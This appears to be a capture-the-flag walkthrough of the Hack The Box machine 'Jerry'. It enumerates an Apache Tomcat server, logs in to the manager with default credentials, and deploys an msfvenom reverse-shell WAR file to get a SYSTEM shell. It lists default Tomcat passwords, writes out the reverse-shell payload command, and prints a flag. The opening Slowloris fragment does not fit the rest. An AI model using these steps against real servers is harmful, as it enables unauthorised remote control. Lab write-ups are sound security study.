|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.

# Enumeration

## Enumerate on 8080
```bash
gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -t 30
```
Seems like there are only one port 8080 open.

![[Jerry-01.png]]

when we access the 8080 port, we will find a Apache Tomcat 
Apache Tomcat/7.0.88 http page.

Sure, first we will gobuster this folder.

From  nmapAutomator output we will try these folder:

```
http://10.10.10.95:8080/examples/
```
![[Jerry-02.png]]

```
http://10.10.10.95:8080/manager/html/upload
```

Seems like upload was a login page.

![[Jerry-03.png]]

```
http://10.10.10.95:8080/manager/html
```

![[Jerry-05.png]]

Also has a login page.

```

# Exploitation
## Tomcat Credential attacks

With login page, let's try the default credential of Apache Tomcat 7

```google
Apache Tomcat 7 default password
```

# Apache Tomcat Default Credentials

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |

|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|
```

Let's try one by one. hahaha and weâ€™re in using the suggested tomcat:s3cret creds dropped me into the admin panel.

```
http://10.10.10.95:8080/manager/html
```

We will find that there are a upload function we could use it to deploy WAR file.

![[Jerry-08.png]]

Let's create a reverse shell WAR file, these payloads can be easily found on the web.

## War shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.4 lport=1234 -f war > shell.war
```

we upload it to web app and click the deploy.

![[Jerry-09.png]]

we build up a listenr for port 1234 And we will click on the file we have just deployed, `http://10.10.10.95:8080/shell/` 

Very Nice! we get the shell!

```bash
whoami
# we will know we have nt authority\system privilege, that means we don't need to do privilege escalation
cd C:\Users\Administrator\Desktop\flags
type "2 for the price of 1.txt"
# user flag
7004dbcef0f854e0fb401875f26ebd00
# root flag
